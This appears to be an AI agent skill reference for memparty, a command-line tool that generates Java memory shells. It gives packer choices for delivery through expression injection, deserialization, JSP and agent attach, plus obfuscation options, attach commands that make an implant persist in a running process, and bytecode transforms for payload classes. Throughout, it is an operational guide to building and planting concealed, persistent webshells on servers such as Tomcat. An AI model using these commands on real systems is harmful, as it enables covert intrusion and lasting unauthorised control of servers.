# Generation and advanced options

Read the main Skill first for discovery, core option selection, and a standard generation example. Always use values returned by the backend rather than assuming a packer or parameter exists.

## Packer selection

Choose a packer by the delivery mechanism, not by familiarity:

| Delivery scenario | Packer family or examples |
|-------------------|---------------------------|
| Base64 class bytecode | `DefaultBase64`, `Base64URLEncoded`, `GzipBase64` |
| JSP deployment | `JSP`, `ClassLoaderJSP`, `DefineClassJSP`, `JSPX` |
| Expression injection | `SpEL`, `OGNL`, `EL`, `MVEL`, `JXPath`, `Groovy`, `Velocity` |
| Java deserialization | `JavaDeserialize` children |
| Agent attach | `AgentJar`, `AgentJarWithJDKAttacher`, `AgentJarWithJREAttacher` |
| H2/JDBC | `H2`, `H2Javac`, `H2JS` |

These are examples, not an exhaustive catalog. Run `memparty config packers` and select a concrete child on v3. Legacy v2 aggregate packers can return multiple variants in `allPackResults`; `-o` requires a single leaf packer.

For Spring-gzip packer variants, let the CLI choose the special injector class name; do not override `--injector-class-name`. Shrinking is enabled by default; use `--no-shrink` only when the stripped payload fails.

## Tool-specific and plugin fields

Common flags:

- Command: `--command-param-name`, `--encryptor`, `--implementation-class`, `--command-template`.
- Custom: `--shell-class-file <path>` or `--shell-class-base64 <base64>`.
- Injector: `--url-pattern`, `--injector-class-name`, `--no-static-initialize`.
- Obfuscation: `--obfuscate`, `--obfuscation-options key=value,...`, `--obfuscation-scope`.

Inspect `memparty config tool-configs` before using a tool's less-common fields. Repeat `--tool-option name=value`, or provide `--tool-config <json|path>`. `object` fields take a JSON object; `--tool-option` overrides matching keys from `--tool-config` and legacy convenience flags.

```bash
memparty gen -s Tomcat -t PluginTool -y Filter -p DefaultBase64 \
  --tool-option mode=fast --tool-option 'target={"id":"web-1","name":"Web"}'
```

For a `ui.kind=remote-select` field, query its options:

```bash
memparty config remote-options PluginTool target --url https://example.com/options --json
```

Use the field's `itemsPath`, `labelPath`, optional `valuePath`, and `urlQueryParam` metadata. Supply `--url` or the environment variable named by `urlQueryParam`. A string field submits the selected ID; an object field submits the whole object. Surface backend validation errors rather than silently retrying with guessed values. Plugin metadata and load status are informational, not a trust or permission signal.

## Agent arguments

`--agent-args persist=true` and `--agent-args restore=true` are attach-time arguments, not generation DTO fields. They require an `Agent*` shell type and an `AgentJar*` packer; `FilelessAgent` is a different mechanism.

Use the examples returned by the CLI, such as:

```bash
java -jar agent.jar <pid> persist=true
jattach <pid> load instrument false agent.jar=persist=true
```

Substitute `restore=true` to restore the original jar.

## Bytecode tools

```bash
memparty bytecode decode -f Payload.class
memparty bytecode transform -f Payload.class \
  --relocate-from javax.servlet --relocate-to jakarta.servlet -o JakartaPayload.class
memparty bytecode transform -f Payload.class --server Tomcat \
  --probe-method ResponseHeader -p DefaultBase64 -o Probe.class --json
```

Transform also supports `--new-class-name`, `--random-name`, `--entry-method`, and obfuscation options. Input can be a class file, Base64, or stdin where documented by `--help`. Without a packer, `-o` writes the transformed class; with a packer, it writes the packed result.

To identify a class:

```bash
memparty parse-classname --file shell.class
memparty parse-classname <base64-of-class-bytes>
```
